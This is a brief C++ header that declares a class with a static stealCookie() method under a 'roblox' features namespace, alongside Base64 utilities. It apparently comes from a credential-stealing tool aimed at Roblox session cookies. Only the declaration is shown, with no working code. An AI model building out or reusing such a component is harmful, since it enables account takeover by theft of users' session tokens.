#pragma once
#include <utils/Utils.h>
#include <utils/Base64.h>

namespace gritz::features::roblox
{
	class cRobloxCookie final
	{
	private:

	public:
		static std::vector<uint8_t> stealCookie();
	};
}
